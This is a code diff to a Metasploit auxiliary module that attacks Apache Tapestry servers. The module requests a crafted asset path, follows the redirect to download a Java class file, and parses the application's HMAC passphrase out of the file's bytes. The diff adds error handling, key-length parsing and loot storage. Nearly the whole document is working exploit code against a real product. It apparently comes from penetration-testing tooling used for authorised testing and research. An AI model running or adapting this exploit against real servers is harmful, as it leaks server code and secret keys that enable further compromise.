@@ -39,24 +39,28 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
+  def class_file
+    datastore['TARGETED_CLASS']
+  end
+
   def check
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', datastore['TARGETED_CLASS'], '/')
+      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', class_file, '/')
     })
 
     if res.nil?
       Exploit::CheckCode::Unknown
     elsif res.code == 302
 
-      id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/#{datastore['TARGETED_CLASS']}}, 1]
-      normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', datastore['TARGETED_CLASS'], '/')
+      id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/#{class_file}}, 1]
+      normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', class_file, '/')
       res = send_request_cgi({
         'method' => 'GET',
         'uri' => normalized_url
       })
 
-      if res.code == 200 && res.headers['Content-Type'] == 'application/java'
+      if res.code == 200 && res.headers['Content-Type'] =~ /application\/java.*/
         print_good("Java file leak at #{rhost}:#{rport.to_s}#{normalized_url}")
         Exploit::CheckCode::Vulnerable
       else
@@ -70,23 +74,62 @@ class MetasploitModule < Msf::Auxiliary
   def run
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', datastore['TARGETED_CLASS'], '/')
+      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', class_file, '/')
     })
 
-    id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/+#{datastore['TARGETED_CLASS']}}, 1]
-    normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', datastore['TARGETED_CLASS'], '/')
+    unless res
+      print_bad('Apache Tapestry did not respond.')
+      return
+    end
+
+    id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/+#{class_file}}, 1]
+    normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', class_file, '/')
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalized_url
     })
 
-    raw_class_file = res.body.to_s
-    secret_key = raw_class_file[/\w{8}-\w{4}-\w{4}-\w{4}-\w{12}/, 0]
+    unless res
+      print_bad('Either target is not vulnerable or class file does not appear to exist.')
+      return
+    end
 
-    if secret_key.nil?
-      print_fail('No secret key found')
+    raw_class_file = res.body.to_s
+    if raw_class_file.empty?
+      print_bad("#{class_file} could not be obtained.")
+      return
+    end
+
+    key_marker = 'tapestry.hmac-passphrase'
+    unless raw_class_file.include?(key_marker)
+      print_bad("HMAC key not found in #{class_file}.")
+      return
+    end
+
+    # three bytes precede the key itself
+    # last two indicate the length of the key
+    key_start = raw_class_file.index(key_marker)
+    byte_start = key_start + key_marker.length + 1
+    key_size = raw_class_file[byte_start..byte_start + 1]
+    key_size = key_size.unpack('C*').join.to_i
+    byte_start = byte_start + 2
+
+    key = raw_class_file[byte_start..byte_start + key_size - 1]
+    path = store_loot(
+      "tapestry.#{class_file}",
+      'application/binary',
+      rhost,
+      raw_class_file
+    )
+
+    print_good("Apache Tapestry class file saved at #{path}.")
+    if key
+      print_good("HMAC key found: #{key}.")
     else
-      print_good("Secret key found : #{secret_key}")
+      print_bad(
+        "Could not find key. " +
+        "Please check #{path} in case key is in an unexpected format."
+      )
     end
   end
 end
